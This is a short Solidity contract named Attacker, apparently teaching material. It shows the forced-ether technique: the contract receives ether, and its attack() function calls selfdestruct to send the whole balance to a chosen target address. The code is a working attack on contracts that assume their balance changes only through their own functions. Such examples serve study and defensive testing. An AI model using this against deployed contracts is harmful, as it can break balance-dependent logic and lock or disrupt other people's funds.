// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.1;

contract Attacker {
    receive() external payable { // we will send ether to this contract

    }

    function attack(address _dontWant) payable external { // this contract will forecfully send all ether to dontWant
        selfdestruct(payable(_dontWant));
    }

    function getBalance() external view returns(uint) {
        return address(this).balance;
    }
}
